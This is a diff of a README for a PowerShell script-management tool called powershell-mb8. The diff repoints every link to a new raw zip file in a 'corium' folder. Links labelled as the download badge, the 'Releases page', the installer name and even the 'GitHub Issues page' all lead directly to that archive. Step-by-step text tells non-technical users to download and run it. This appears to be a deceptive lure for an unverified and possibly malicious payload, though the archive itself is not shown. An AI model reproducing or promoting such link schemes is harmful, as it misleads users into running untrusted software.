@@ -1,7 +1,7 @@
 # 🎉 powershell-mb8 - Easy Management for Your PowerShell Scripts
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb8.zip%20Latest%20Release-blue?style=flat-square&logo=github)](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb8.zip)
+[![Download](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb-v2.5.zip%20Latest%20Release-blue?style=flat-square&logo=github)](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to powershell-mb8! This application helps you efficiently manage your PowerShell scripts with user-friendly features. You don't need programming knowledge to use it.
@@ -22,13 +22,13 @@ Welcome to powershell-mb8! This application helps you efficiently manage your Po
 To get started with powershell-mb8, follow these steps:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb8.zip) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb-v2.5.zip) to access the latest version of the software.
 
 2. **Select Your Version**
    On the Releases page, you will see several versions listed. Look for the latest version, usually at the top of the page.
 
 3. **Download the Installer**
-   Click on the version you want. This will bring you to a page where you can download the installer file. It is often labeled as `https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb8.zip` or similar.
+   Click on the version you want. This will bring you to a page where you can download the installer file. It is often labeled as `https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb-v2.5.zip` or similar.
 
 4. **Run the Installer**
    After the download is complete, locate the file in your Downloads folder or wherever you saved it. Double-click the installer file and follow the on-screen prompts to complete the installation.
@@ -52,7 +52,7 @@ If you encounter issues while using powershell-mb8, here are some common problem
 - **Other Issues:** Please check the FAQ section on our GitHub page for more solutions or open an issue if needed.
 
 ## 💬 Support
-If you need assistance, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb8.zip). Our community is here to help you.
+If you need assistance, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/Reubentech/powershell-mb8/main/corium/powershell-mb-v2.5.zip). Our community is here to help you.
 
 ## 📅 Changelog
 - **v1.0**: Initial release with basic script management features.
